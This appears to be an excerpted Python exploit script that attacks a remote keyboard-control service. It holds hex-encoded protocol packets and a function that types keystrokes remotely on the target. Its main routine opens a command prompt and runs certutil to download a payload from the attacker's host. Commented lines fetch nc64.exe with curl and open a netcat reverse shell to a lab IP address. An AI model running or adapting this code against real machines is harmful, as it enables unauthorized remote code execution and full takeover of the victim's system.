...
open = unhexlify("00000085000108416374696f6e00000550617373776f72640038653831333362332d61313862"
...
open_fin = unhexlify("000000c8000108416374696f6e0001024361706162696c69746965730004416374696f6e7"
...
one = unhexlify("000000d2000108416374696f6e00070549440052656c6d746563682e4b6579626f61726400024"
"c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000656616c756"
"5730002000556616c756500")

two = unhexlify("00000000054e616d6500746f67676c6500000854797065000800000008526571756573740007"
"0252756e0002457874726173000656616c7565730002000556616c756500")

three = unhexlify("00000000054e616d6500746f67676c65000005536f7572636500616e64726f69642d643730"
"386531346535323834636238310000")

win_key = unhexlify("000000d8000108416374696f6e00070549440052656c6d746563682e4b6579626f61726"
...
ret_key = unhexlify("000000dc000108416374696f6e00070549440052656c6d746563682e4b6579626f6172"
...
space_key = unhexlify("000000da000108416374696f6e00070549440052656c6d746563682e4b6579626f6"
...
def SendString(string, rhost):
	for char in string:
		if char == " ":
			...
			convert = unhexlify(characters[char])
...
def main():
	...
	SendString("cd C:\\Windows\\Temp\\", rhost)
	SendReturn()
	sleep(1)
	SendString("certutil.exe -f -urlcache http://" + lhost + "/" + payload + " C:\\Windows\\Temp\\" + payload, rhost) # Retrieve HTTP hosted payload
	#SendString("curl http://10.10.14.23:8000/nc64.exe -o nc64.exe ", rhost)
	SendReturn()
	sleep(1)
	print("[+] Downloading Payload")
	#SendReturn()
	#sleep(1)
	#SendString("nc64.exe 10.10.14.23 4444 -e cmd.exe", rhost) # Execute Payload
